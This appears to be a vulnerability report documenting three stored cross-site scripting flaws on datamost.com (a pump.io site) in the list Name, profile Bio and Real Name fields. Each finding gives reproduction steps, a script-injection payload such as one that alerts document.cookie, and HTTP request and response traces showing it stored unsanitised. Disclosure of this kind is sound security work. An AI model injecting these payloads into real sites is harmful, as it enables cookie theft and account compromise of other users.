
### Stored XSS #1

https://datamost.com/<USERNAME>lists

- Vulnerable parameter "Name"

To Replicate Findings:
  

1. Login to account
2. Go to Lists page
3. Select New List
4. Select "Name" 
4. Add XSS payload "><script>alert(document.cookie)</script> 


```
// HTTP POST request with XSS payload

POST /api/user/<USERNAME>/feed/minor HTTP/1.1
Host: datamost.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
[...]

{"verb":"create","object":{"objectType":"collection","objectTypes":["person"],"displayName":"\"><script>alert(document.cookie)</script>","content":"test"}}


// HTTP response showing unsanizited XSS payload

HTTP/1.1 200 OK
X-Powered-By: Express
Vary: X-HTTP-Method-Override, Accept-Encoding
Server: pump.io/5.1.0 express/4.16.2 node.js/v6.17.1
[...]

{"verb":"create","object":{"objectType":"collection","objectTypes":["person"],"displayName":"\"><script>alert(document.cookie)</script>","content":";"test",
[...]
```
  

### Stored XSS #2

https://datamost.com/main/settings

- Vulnerable parameter "Bio"

To Replicate Findings:

1. Login to account
2. Go to settings page
3. Select "Bio" 
4. Add XSS payload "><script>alert(`xss`)</script>
  

```
// HTTP POST request with XSS payload

PUT /api/user/test1231123123123/profile HTTP/1.1
Host: datamost.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
[...]

"pump_io":{"followed":false},"location":{"objectType":"place","displayName":"\"test"},"summary":"\"><script>alert(`bio_xss`)</script>"[...]


// HTTP response showing unsanitized XSS payload

HTTP/1.1 200 OK
X-Powered-By: Express
Server: pump.io/5.1.0 express/4.16.2 node.js/v6.17.1
[...]

"location":{"objectType":"place","displayName":"\"><script>alert(`bio_xss`)</script>"}
[...]


// HTTP GET request to feed page

GET /api/user/<USERNAME>/feed/minor?since=<URL_MODIFIED> HTTP/1.1
Host: datamost.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
[...]


// HTTP response showing unsanitized XSS payload

"location":{"objectType":"place","displayName":"\"><script>alert(`xss`)</script>"}
[...]
```

  
  
### Stored XSS #3

https://datamost.com/main/settings


- Vulnerable parameter "Real Name"

To Replicate Findings:

1. Login to account
2. Go to settings page
3. Select "Real Name"
4. Add XSS payload "><script>alert(`xss`)</script>


```
// HTTP POST request with XSS payload

PUT /api/user/test1231123123123/profile HTTP/1.1
Host: datamost.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
[...]


{"preferredUsername":"test1231123123123","url":"https://datamost.com/test1231123123123","displayName":"\"><script>alert(1)</script>"
[...]
```
  

